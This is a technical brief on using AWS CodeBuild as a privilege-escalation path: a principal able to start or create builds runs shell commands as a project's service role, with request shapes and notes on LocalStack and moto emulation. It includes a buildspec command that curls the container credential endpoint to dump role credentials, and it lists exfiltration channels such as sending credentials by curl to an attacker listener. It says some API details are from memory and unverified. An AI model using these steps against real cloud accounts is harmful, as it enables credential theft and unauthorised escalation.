# AWS CodeBuild as privesc primitive + LocalStack emulation (tech brief)

## 1. Mechanic
Principal with codebuild:CreateProject + iam:PassRole(role R) + codebuild:StartBuild (or only StartBuild on an existing project with
a buildspec override) runs arbitrary shell as R. Build container runs the buildspec `phases.*.commands` via a shell. On real AWS the
container has creds for the project's serviceRole delivered through the container credential endpoint:
env AWS_CONTAINER_CREDENTIALS_RELATIVE_URI -> http://169.254.170.2$URI (ECS-style), also usable by the SDK/CLI automatically
(`aws sts get-caller-identity` inside the build = service role). So the buildspec can just call AWS CLI as R, or dump creds:
  commands: ["curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "env"]
(IMDS 169.254.169.254 is generally not the path on CodeBuild standard; use the container endpoint.)
Variants: existing project + StartBuild with buildspecOverride (no PassRole needed; runs as that project's existing role);
UpdateProject to swap buildspec/serviceRole (needs PassRole to change role); StartBuild serviceRoleOverride (needs PassRole).
Role trust must allow codebuild.amazonaws.com. Privileged mode / docker also possible.

## 2. API shapes
Protocol: AWS JSON 1.1, POST https://codebuild.<region>.amazonaws.com/, Content-Type: application/x-amz-json-1.1,
X-Amz-Target: CodeBuild_20161006.<Op>, SigV4 service name "codebuild". No classic Query/Action= form (JSON only).
- ListProjects:      {"sortBy":"NAME","sortOrder":"ASCENDING","nextToken":".."}  -> {"projects":[names]}
- BatchGetProjects:  {"names":["p1"]}  -> projects[] incl. serviceRole, environment, source.buildspec, environmentVariables
- CreateProject:     {"name":"x","source":{"type":"NO_SOURCE","buildspec":"version: 0.2\nphases:\n build:\n  commands:\n   - id"},
                      "artifacts":{"type":"NO_ARTIFACTS"},
                      "environment":{"type":"LINUX_CONTAINER","image":"aws/codebuild/standard:7.0","computeType":"BUILD_GENERAL1_SMALL"},
                      "serviceRole":"arn:aws:iam::ACCT:role/R"}
- StartBuild:        {"projectName":"x","buildspecOverride":"<yaml or s3 path>","sourceTypeOverride":"NO_SOURCE",
                      "sourceLocationOverride":"..","environmentTypeOverride":"LINUX_CONTAINER","imageOverride":"..",
                      "computeTypeOverride":"BUILD_GENERAL1_SMALL","serviceRoleOverride":"arn:..",
                      "environmentVariablesOverride":[{"name":"K","value":"V","type":"PLAINTEXT"}],
                      "artifactsOverride":{...},"logsConfigOverride":{...},"timeoutInMinutesOverride":5,
                      "privilegedModeOverride":true,"imagePullCredentialsTypeOverride":"CODEBUILD"}
                      -> {"build":{"id":"x:uuid","buildStatus":"IN_PROGRESS","currentPhase":..,"serviceRole":..}}
- BatchGetBuilds:    {"ids":["x:uuid"]}  -> builds[] with buildStatus, currentPhase, phases[], logs{groupName,streamName,deepLink},
                      environment, serviceRole, artifacts, startTime/endTime
Also: ListBuildsForProject {"projectName"}, ListBuilds, UpdateProject, StopBuild {"id"}.

## 3. Reading output w/o CloudWatch
- Responses never contain command stdout. Only status/phases (phases[].contexts[] have statusCode/message, mainly for failures,
  e.g. a failing command's message "Error while executing command: <cmd>. Reason: exit status N" — a weak 1-bit/short channel).
- Exfil options: (a) artifacts to S3 (project artifacts type S3 / artifactsOverride {"type":"S3","location":bucket,"name":..};
  buildspec `artifacts: files: [out.txt]`), role needs s3:PutObject; (b) buildspec writes via AWS CLI to anything R can reach
  (S3 put, SSM PutParameter, SecretsManager, a public bucket, curl to attacker host); (c) env vars: `env.exported-variables`
  in buildspec are returned in BatchGetBuilds -> builds[].exportedEnvironmentVariables [{name,value}] — good no-S3 channel
  (needs `export X=...` in an earlier command; values visible in API, not secret-masked); (d) default CloudWatch Logs
  (logs.cloudWatchLogs, group /aws/codebuild/<proj>) needs logs:GetLogEvents by caller; S3 logs via logsConfigOverride;
  (e) just curl creds to attacker listener.

## 4. LocalStack
- CodeBuild is NOT in community; docs list it under paid plans (Base/Ultimate, i.e. Pro). Edition note: page said "Base and Ultimate".
- Real execution: on StartBuild LocalStack launches a container named `localstack-codebuild-<buildid>` (uses AWS CodeBuild agent,
  Docker Compose inside) which runs the buildspec; requires docker socket mounted into LocalStack. Endpoint: normal gateway
  http://localhost:4566 (or localhost.localstack.cloud:4566), JSON X-Amz-Target CodeBuild_20161006.* works as usual.
- Quirks/limits: 16/59 ops (BatchDeleteBuilds, BatchGetBuilds, ListBuilds, ListBuildsForProject, StartBuild, BatchGetProjects,
  CreateProject, DeleteProject, ListProjects, UpdateProject, fleets x3, source creds x3). Sources only S3, NO_SOURCE, CODEPIPELINE.
  Image ignored: always Amazon Linux 2023 unless CODEBUILD_ENABLE_CUSTOM_IMAGES set (custom needs bash). Docs: buildspec
  env vars unsupported. Only final build status reported (no per-phase). No persistence. The IAM role is not truly enforced
  (IAM enforcement off by default); creds inside container are LocalStack's emulated endpoint/test creds, so "escalation" is
  against LocalStack's own services (container is configured to reach LocalStack; AWS_ENDPOINT_URL likely injected - verify by `env`).
  Container has docker/host-adjacent access, so command exec may also reach the LocalStack host's docker network (verify).
- moto (also used as LocalStack's older/fallback and standalone moto_server, default :5000): implements only batch_get_builds,
  batch_get_projects, create_project, delete_project, list_builds, list_builds_for_project, list_projects, start_build, stop_build.
  Moto is a pure mock: start_build returns fake build record, buildspec is NEVER executed; no output. Distinguish: if builds
  stay/skip to SUCCEEDED instantly with no localstack-codebuild-* container => mock.
- Test: StartBuild then `docker ps` on host for localstack-codebuild-*, poll BatchGetBuilds; use exported-variables or an
  S3 artifact to read results; also have the buildspec `curl` a listener you control to prove execution.

## Sources
https://docs.localstack.cloud/aws/services/codebuild/
https://docs.localstack.cloud/aws/ci-pipelines/codebuild/
https://docs.getmoto.org/en/latest/docs/services/codebuild.html
https://docs.aws.amazon.com/codebuild/latest/APIReference/API_StartBuild.html (API shapes from AWS API reference/botocore, from memory; not re-fetched)
Confidence: LocalStack facts fetched from docs; AWS shapes/privesc mechanic from established knowledge (not re-verified this session).
